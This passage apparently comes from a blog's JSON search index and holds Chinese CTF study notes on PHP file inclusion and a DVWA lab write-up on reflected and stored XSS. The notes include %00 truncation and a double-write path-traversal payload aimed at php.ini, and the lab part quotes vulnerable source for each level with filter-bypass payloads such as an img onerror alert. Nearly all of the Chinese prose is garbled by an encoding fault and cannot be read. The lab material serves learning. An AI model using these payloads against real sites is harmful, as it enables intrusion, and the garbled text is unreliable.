require()ï¼šåªè¦ç¨‹åºæ‰§è¡Œå°±åŒ…å«æ–‡ä»¶è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶ä¼šè¾“å‡ºé”™è¯¯ç»“æœå¹¶ç»ˆæ­¢è¿è¡Œã€‚ require_once()ï¼šå’Œrequire()åŠŸèƒ½ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚ %00æˆªæ–­ï¼ˆåœ¨PHP5.3.4ä¹‹å‰æœ‰æ•ˆï¼‰åœ¨$_GET[&quot;filename&quot;]ä¸­å¸¸è§ å½¢å¼ï¼šfilename=test.php%00.txt ä¸»è¦åˆ©ç”¨ï¼šä¸Šä¼ æ—¶è·¯å¾„å¿…é¡»ä¸º ä¸Šä¼ è·¯å¾„å¿…é¡»ä¸ºtxtã€pngç­‰ç»“å°¾æ—¶ æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œç»•è¿‡ç™½åå•æ£€æŸ¥ æ–‡ä»¶åŒ…å«æ—¶ï¼Œæˆªæ–­åé¢é™åˆ¶ï¼ˆä¸»è¦æ˜¯æ–‡ä»¶åŒ…å«æ—¶ï¼‰ PSï¼šPHPé…ç½®ä¸­magic_quotes_gpc=Offï¼Œå³æ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰è§£æã€‚ ä»æ ¹ç›®å½•æœå¯»/../../../../../../www/dvwa/php.ini å‰é¢å¿…é¡»åŠ /ï¼Œè¡¨ç¤ºä»æ ¹ç›®å½•å¼€å§‹ã€‚ åŒå†™é‡æ„é€ str_replace(array(&quot;../&quot;,&quot;..\\&quot;),&quot;&quot;,$file); payloadï¼š?page=/..././..././www/dvwa/php.ini fileåŒ…å«file://åè®®ï¼ˆæœ¬åœ°åŒ…å«æ–‡ä»¶ï¼‰ï¼šå°†ç»å¯¹è·¯å¾„ä¸‹çš„æ–‡ä»¶åŒ…å«è¿›æ¥ã€‚ æ¼æ´åˆ©ç”¨ï¼š ä¸Šä¼ ä¸€ä¸ªå†…å®¹ä¸ºphpçš„æ–‡ä»¶ åˆ©ç”¨fileåè®®å–åŒ…å«ä¸Šä¼ æ–‡ä»¶ï¼ˆéœ€è¦çŸ¥é“ä¸Šä¼ æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼‰ å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ PHPç›¸å…³å‡½æ•°æ•´ç† å‡½æ•° åŠŸèƒ½ extract() ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚ isset() æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼Œå¹¶ä¸”ä¸æ˜¯ NULLã€‚ trim() ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚ file_get_contents() ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚ print_r() æ˜¾ç¤ºå…³äºä¸€ä¸ªå˜é‡çš„æ˜“äºç†è§£çš„ä¿¡æ¯ã€‚å¦‚æœç»™å‡ºçš„æ˜¯ stringã€integer æˆ– floatï¼Œå°†æ‰“å°å˜é‡å€¼æœ¬èº«ã€‚å¦‚æœç»™å‡ºçš„æ˜¯ arrayï¼Œå°†ä¼šæŒ‰ç…§ä¸€å®šæ ¼å¼æ˜¾ç¤ºé”®å’Œå…ƒç´ ã€‚object ä¸æ•°ç»„ç±»ä¼¼ã€‚ scandir() è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚ phpinfo() è¾“å‡º PHP å½“å‰çŠ¶æ€çš„å¤§é‡ä¿¡æ¯ï¼ŒåŒ…å«äº† PHP ç¼–è¯‘é€‰é¡¹ã€å¯ç”¨çš„æ‰©å±•ã€PHP ç‰ˆæœ¬ã€æœåŠ¡å™¨ä¿¡æ¯å’Œç¯å¢ƒå˜é‡ï¼ˆå¦‚æœç¼–è¯‘ä¸ºä¸€ä¸ªæ¨¡å—çš„è¯ï¼‰ã€PHPç¯å¢ƒå˜é‡ã€æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€path å˜é‡ã€é…ç½®é€‰é¡¹çš„æœ¬åœ°å€¼å’Œä¸»å€¼ã€HTTP å¤´å’ŒPHPæˆæƒä¿¡æ¯(License)ã€‚ eval() æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ã€‚è¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„ PHP ä»£ç ï¼Œä¸”å¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚å¦‚æœæ²¡æœ‰åœ¨ä»£ç å­—ç¬¦ä¸²ä¸­è°ƒç”¨ return è¯­å¥ï¼Œåˆ™è¿”å› NULLã€‚å¦‚æœä»£ç ä¸­å­˜åœ¨è§£æé”™è¯¯ï¼Œåˆ™ eval() å‡½æ•°è¿”å› falseã€‚ var_dump() æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚ include() è·å–æŒ‡å®šæ–‡ä»¶ä¸­å­˜åœ¨çš„æ‰€æœ‰æ–‡æœ¬/ä»£ç /æ ‡è®°ï¼Œå¹¶å¤åˆ¶åˆ°ä½¿ç”¨ include è¯­å¥çš„æ–‡ä»¶ä¸­ã€‚ show_source() å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚ å‚è€ƒç½‘ç«™http://vinc.top/2016/09/28/%E3%80%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/https://lightless.me/archives/include-file-from-zip-or-phar.htmlhttps://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"WEBå…¥é—¨ï¼ˆå››ï¼‰","slug":"WEBå…¥é—¨ï¼ˆå››ï¼‰","date":"2018-07-08T01:08:01.000Z","updated":"2019-02-03T09:43:51.491Z","comments":true,"path":"2018/07/08/WEBå…¥é—¨ï¼ˆå››ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/08/WEBå…¥é—¨ï¼ˆå››ï¼‰/","excerpt":"æ¶›å“¥å¸¦æˆ‘å­¦XSSã€‚","text":"æ¶›å“¥å¸¦æˆ‘å­¦XSSã€‚ åŸºç¡€çŸ¥è¯†HTMLä¸€ç§è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ã€‚å…¶ç»“æ„åŒ…æ‹¬å¤´éƒ¨åˆ†ï¼ˆHeadï¼‰å’Œä¸»ä½“éƒ¨åˆ†ï¼ˆBodyï¼‰ï¼Œå…¶ä¸­å¤´éƒ¨æä¾›å…³äºç½‘é¡µçš„ä¿¡æ¯ï¼Œä¸»ä½“éƒ¨åˆ†æä¾›ç½‘é¡µçš„å…·ä½“å†…å®¹ã€‚ç”±HTMLå„ç±»æ ‡ç­¾ç»„æˆã€‚ å„ç±»æ ‡ç­¾ï¼š æ ‡ç­¾ åŠŸèƒ½ img æ’å…¥å›¾ç‰‡ body æ–‡æ¡£çš„ä¸»ä½“ iframe åœ¨ç½‘é¡µæ˜¾ç¤ºç½‘é¡µ Javascriptä¸€ç§ç›´è¯‘å¼è„šæœ¬è¯­è¨€ï¼Œæ˜¯ä¸€ç§åŠ¨æ€ç±»å‹ã€å¼±ç±»å‹ã€åŸºäºåŸå‹çš„è¯­è¨€ï¼Œå†…ç½®æ”¯æŒç±»å‹ã€‚å®ƒçš„è§£é‡Šå™¨è¢«ç§°ä¸ºJavaScriptå¼•æ“ï¼Œä¸ºæµè§ˆå™¨çš„ä¸€éƒ¨åˆ†ï¼Œå¹¿æ³›ç”¨äºå®¢æˆ·ç«¯çš„è„šæœ¬è¯­è¨€ï¼Œæœ€æ—©æ˜¯åœ¨HTMLç½‘é¡µä¸Šä½¿ç”¨ï¼Œç”¨æ¥ç»™HTMLç½‘é¡µå¢åŠ åŠ¨æ€åŠŸèƒ½ã€‚ cookieä¸sessionä¼šè¯ï¼ˆSessionï¼‰è·Ÿè¸ªæ˜¯Webç¨‹åºä¸­å¸¸ç”¨çš„æŠ€æœ¯ï¼Œç”¨æ¥è·Ÿè¸ªç”¨æˆ·çš„æ•´ä¸ªä¼šè¯ã€‚å¸¸ç”¨çš„ä¼šè¯è·Ÿè¸ªæŠ€æœ¯æ˜¯Cookieä¸Sessionã€‚Cookieé€šè¿‡åœ¨å®¢æˆ·ç«¯è®°å½•ä¿¡æ¯ç¡®å®šç”¨æˆ·èº«ä»½ï¼ŒSessioné€šè¿‡åœ¨æœåŠ¡å™¨ç«¯è®°å½•ä¿¡æ¯ç¡®å®šç”¨æˆ·èº«ä»½ã€‚ WAFWebåº”ç”¨é˜²æŠ¤ç³»ç»Ÿï¼ˆä¹Ÿç§°ï¼šç½‘ç«™åº”ç”¨çº§å…¥ä¾µé˜²å¾¡ç³»ç»Ÿã€‚è‹±æ–‡ï¼šWeb Application Firewallï¼Œç®€ç§°ï¼š WAFï¼‰ã€‚å›½é™…ä¸Šå…¬è®¤çš„ä¸€ç§è¯´æ³•æ˜¯ï¼šWebåº”ç”¨é˜²ç«å¢™æ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP/HTTPSçš„å®‰å…¨ç­–ç•¥æ¥ä¸“é—¨ä¸ºWebåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚ Javascriptå¼¹æ¡†æ“ä½œJavascriptå‡½æ•°å†…åµŒå®ç°å½¢å¼ï¼š&lt;script&gt;Javascriptçš„å‡½æ•°&lt;/script&gt; ç›¸å…³å‡½æ•°ï¼š alert()ï¼šç”¨äºæç¤º confirm()ï¼šç”¨äºå’Œç”¨æˆ·äº¤äº’ç¡®è®¤ prompt()ï¼šå¼¹æ¡†è®©ç”¨æˆ·è¾“å…¥ä¿¡æ¯ XSSè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆcross site script executionï¼‰ï¼Œä¸€ç§å‡ºç°åœ¨webåº”ç”¨ç¨‹åºä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ã€‚ç”±äºwebåº”ç”¨å¯¹ç”¨æˆ·çš„è¾“å…¥è¿‡æ»¤ä¸ä¸¥è€Œäº§ç”Ÿã€‚æ¶æ„æ”»å‡»è€…é€šè¿‡HTMLæ³¨å…¥ç¯¡æ”¹ç½‘é¡µï¼Œæ’å…¥æ¶æ„è„šæœ¬ï¼Œä»è€Œæ§åˆ¶ç”¨æˆ·æµè§ˆå™¨è¡Œä¸ºçš„ä¸€ç§æ”»å‡»æ–¹å¼ã€‚ å±å®³ ç½‘ç»œé’“é±¼ï¼ŒåŒ…æ‹¬ç›—å–å„ç±»çš„ç”¨æˆ·è´¦å· çªƒå–ç”¨æˆ·cookie å¼ºåˆ¶å¼¹å‡ºå¹¿å‘Šé¡µé¢ï¼Œåˆ·æµé‡ é¡µé¢æŒ‚é©¬ æå‡ç”¨æˆ·æƒé™ï¼Œè¿›ä¸€æ­¥æ¸—é€ç½‘ç«™ ä¼ æ’­æ‰©å±•è„šæœ¬è •è™« ç›¸æ¯”äºSQLæ³¨å…¥ï¼ŒSQLæ³¨å…¥æ˜¯å¯¹åç«¯çš„æ¶æ„ç¯¡æ”¹ï¼Œè€ŒXSSæ˜¯å¯¹å‰ç«¯çš„æ¶æ„æ”»å‡»ã€‚ åå°„å‹XSSä¹Ÿç§°ä¸ºéæŒä¹…æ€§ã€å‚æ•°å‹è·¨ç«™è„šæœ¬ã€‚ä¸»è¦ç”¨äºå°†æ¶æ„çš„è„šæœ¬é™„åŠ åˆ°URLåœ°å€çš„å‚æ•°ä¸­ã€‚ ä¸€èˆ¬ä½¿ç”¨çš„å·²ç»æ„é€ å¥½çš„æ¶æ„URLå‘é€ç»™å—å®³è€…ï¼Œè¯±ä½¿å—å®³è€…ç‚¹å‡»è§¦å‘ï¼Œåªæ‰§è¡Œä¸€æ¬¡ã€‚ å­˜å‚¨å‹XSSæ¯”åå°„å‹è·¨ç«™è„šæœ¬æ›´å…·å¨èƒï¼Œå¹¶ä¸”å¯èƒ½å½±å“åˆ°webæœåŠ¡å™¨çš„è‡ªèº«å®‰å…¨ã€‚ æ”»å‡»è€…äº‹å…ˆå°†æ¶æ„JavaScriptä»£ç ä¸Šä¼ æˆ–å­˜å‚¨åˆ°æ¼æ´æœåŠ¡å™¨ä¸­ï¼Œåªè¦å—å®³è€…æµè§ˆåŒ…å«æ­¤æ¶æ„ä»£ç çš„é¡µé¢å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚ ç»•è¿‡XSSé™åˆ¶ ç»•è¿‡magic_quotes_gpcï¼ˆé€šè¿‡String.fromCharCode()å‡½æ•°ï¼‰ HEXç¼–ç  æ”¹å˜å¤§å°å†™ å…³é—­æ ‡ç­¾ï¼ˆ&gt;&lt;script&gt;slert(&#39;xss&#39;);&lt;/script&gt;ï¼‰ï¼ˆé—­åˆå‰é¢çš„æ ‡ç­¾ï¼‰ ç›¸å…³PHPå‡½æ•° str_replace()ï¼šä»¥å…¶ä»–å­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ addslashes()ï¼šåœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆ&#39;ã€&quot;ã€\\ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ  stripslashes()ï¼šåˆ é™¤ç”±addslashes()å‡½æ•°æ·»åŠ çš„åæ–œæ  trim()ï¼šç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ htmlspecialchars()ï¼šæŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ï¼ˆ&amp;ï¼ˆå’Œå·ï¼‰æˆä¸º&amp;ï¼›&quot;ï¼ˆåŒå¼•å·ï¼‰æˆä¸º&quot;ï¼›&#39;ï¼ˆå•å¼•å·ï¼‰æˆä¸º â€˜ï¼›&lt;ï¼ˆå°äºï¼‰æˆä¸º&lt;ï¼›&gt;ï¼ˆå¤§äºï¼‰æˆä¸º&gt;ï¼‰ htmlspecialchars_decode()ï¼šæŠŠé¢„å®šä¹‰çš„HTMLå®ä½“è½¬æ¢ä¸ºå­—ç¬¦ mysql_real_escape_string()ï¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šç¬¦å·ï¼ˆ\\x00ã€\\nã€\\rã€\\ã€&#39;ã€&quot;ã€\\x1aï¼‰è¿›è¡Œè½¬ä¹‰ strip_tags()ï¼šå‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨æ ‡ç­¾ DVWAä¹‹XSSä»Šå¤©åœ¨è¿™é‡Œé‡åˆ°äº†ä¸¤ä¸ªå‘è®°å½•ä¸€ä¸‹ã€‚ å‘ç°Metasploitableä¸­çš„DVWAç‰ˆæœ¬æœ‰ç‚¹æ–°ï¼ŒHigh Levelç«Ÿç„¶å°±æ˜¯Impossible Levelã€‚æœ€åè¿˜æ˜¯ç”¨äº†ä»¥å‰PHPSTUDYé‡Œçš„æ—§ç‰ˆæœ¬æ¥å®éªŒã€‚ è¿˜æœ‰å°±æ˜¯é‡ç½®æ•°æ®åº“çš„æ—¶å€™å‡ºç°äº†æ— æ³•åˆ é™¤dvwaæ•°æ®åº“çš„é”™è¯¯ã€‚åœ¨å‘½ä»¤è¡Œå’Œå›¾å½¢ç•Œé¢éƒ½åˆ é™¤ä¸äº†ï¼Œæœ€åç›´æ¥å»mysqlç›®å½•ä¸‹åˆ é™¤ï¼Œæ‰å¯ä»¥é‡ç½®ã€‚ å®éªŒä¸­ä¸»è¦æ ¹æ®æºç åˆ†æè¢«è¿‡æ»¤çš„éƒ¨åˆ†ï¼Œå¯»æ‰¾ç»•è¿‡çš„æ–¹æ³•ã€‚ XSS Reflectedï¼ˆåå°„å‹XSSï¼‰åå°„å‹ç›¸å¯¹ç®€å•ä¸€äº›ã€‚ Lowæºç ï¼š 1234567&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; è¿™é‡Œæ˜¾ç„¶å¯¹è¾“å…¥å†…å®¹æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚ç›´æ¥è¾“å…¥&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;å°±æœ‰å¼¹çª—å›æ˜¾ã€‚ Mediumæºç ï¼š 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; è¿™é‡Œé€šè¿‡str_replaceå‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²&lt;script&gt;æ›¿æ¢æˆç©ºä¸²ï¼Œæ•…åªè¦åŒå†™æˆ–æ˜¯å¤§å°å†™æ··ç”¨å³å¯ç»•è¿‡ã€‚ æ„é€ payload&lt;SCript&gt;alert(&#39;1&#39;)&lt;/script&gt;æˆ–è€…&lt;scri&lt;script&gt;pt&gt;alert(&#39;1&#39;)&lt;/script&gt;ã€‚ Highæºç ï¼š 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; æºç ä¸­å°†æ‰€æœ‰çš„&lt;script&gt;å®Œå…¨è¿‡æ»¤äº†ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ä¸­/iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œä½¿ç”¨&lt;script&gt;æ ‡ç­¾æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡å…¶ä»–æ–¹å¼ã€‚ åœ¨HTMLçš„æ ‡ç­¾ä¸­ï¼Œimgã€bodyã€iframeç­‰æ ‡ç­¾çš„srcæ³¨å…¥æ¶æ„ä»£ç ã€‚payloadä¸ºï¼š&lt;img src=1 onerror=alert(&quot;1&quot;) /&gt;ï¼ˆonerroräº‹ä»¶ä¼šåœ¨æ–‡æ¡£æˆ–å›¾åƒåŠ è½½è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯æ—¶è¢«è§¦å‘ã€‚åœ¨è£…è½½æ–‡æ¡£æˆ–å›¾åƒçš„è¿‡ç¨‹ä¸­å¦‚æœå‘ç”Ÿäº†é”™è¯¯ï¼Œå°±ä¼šè°ƒç”¨è¯¥äº‹ä»¶å¥æŸ„ã€‚ï¼‰ Impossibleæºç ï¼š 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; è¿™é‡Œä½¿ç”¨äº†htmlspecialchars()å‡½æ•°ï¼Œå°†è¾“å…¥çš„æ¶æ„ä»£ç è½¬æ¢æˆHTMLå®ä½“ï¼Œå®Œå…¨è¿‡æ»¤äº†æ¶æ„ä»£ç ï¼Œæ— æ³•è¿›è¡Œæ”»å‡»ã€‚ XSS Storedï¼ˆå­˜å‚¨å‹XSSï¼‰å­˜å‚¨å‹å¤§å¤šæ•°å­˜åœ¨ç•™è¨€æ¿ä¸­ï¼Œç•™è¨€æ¿åˆä¸€èˆ¬å­˜åœ¨å‡ ä¸ªæ–‡æœ¬è¾“å…¥æ¡†ã€‚æ¯ä¸ªè¾“å…¥æ¡†éƒ½å¯ä»¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨XSSã€‚ æ¯æ¬¡æˆåŠŸå¼¹çª—åï¼Œæ¶æ„ä»£ç éƒ½ä¼šè¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥æ¯æ¬¡è¿›å…¥è¯¥é¡µé¢éƒ½ä¼šå‡ºç°ä¹‹å‰çš„å¼¹çª—ã€‚ Lowæºç ï¼š 12345678910111213141516&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; æºç ä¸­å¯¹nameå’Œmessageå¤„çš„ä¿¡æ¯æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œæ•…å¯ä»¥ç›´æ¥å°è¯•xssã€‚ åœ¨messageä¸€æ ç›´æ¥è¾“å…¥&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;å°±å¯ä»¥å‡ºå‘å¼¹çª—ã€‚åœ¨nameä¸€æ ä¸­æœ‰å­—æ•°é•¿åº¦é™åˆ¶ï¼Œæ•…ç”¨burpsuiteæŠ“åŒ…ä¹‹åï¼Œå†ä¿®æ”¹nameæ ä¸­çš„å­—ç¬¦ä¸²ä¸º&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;ï¼Œæ”¾åŒ…åè§¦å‘å¼¹çª—ã€‚ Mediumæºç ï¼š 12345678910111213141516 &lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = trim(strip_tags(addslashes($message))); $message = mysql_real_escape_string($message); $message = htmlspecialchars($message); // Sanitize name input $name = str_replace('&lt;script&gt;', '', $name); $name = mysql_real_escape_string($name); $query = \"INSERT INTO guestbook (comment,name) VALUES ('$message','$name');\"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );&#125;?&gt; è¿™é‡Œå’Œå‰ä¸€é¢˜ä¸€æ ·ï¼Œé€šè¿‡str_replaceå‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²&lt;script&gt;æ›¿æ¢æˆç©ºä¸²ã€‚ nameå¤„å¯ä»¥ç»§ç»­é€šè¿‡æŠ“åŒ…æ¥è¿›è¡ŒXSSã€‚è€Œmessageå¤„è¾“å…¥çš„å†…å®¹è¢«htmlspecialchars()å‡½æ•°è¿‡æ»¤ï¼Œä¸å­˜åœ¨XSSã€‚ Highæºç ï¼š 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; åœ¨nameå¤„å’Œä¸Šä¸€é¢˜çš„high levelå¤„æ˜¯ä¸€æ ·çš„æ¼æ´ã€‚æ•…è™½ç„¶è¿‡æ»¤äº†&lt;script&gt;ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡HTMLçš„æ ‡ç­¾è§¦å‘äº‹ä»¶ï¼Œå¼•èµ·å¼¹çª—ã€‚ Impossibleæºç ï¼š 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; å°†nameå’Œmessageå¤„è¾“å…¥çš„æ•°æ®éƒ½ç»è¿‡htmlspecialchars()å‡½æ•°çš„å¤„ç†ï¼Œå®Œå…¨è¢«è¿‡æ»¤ã€‚ 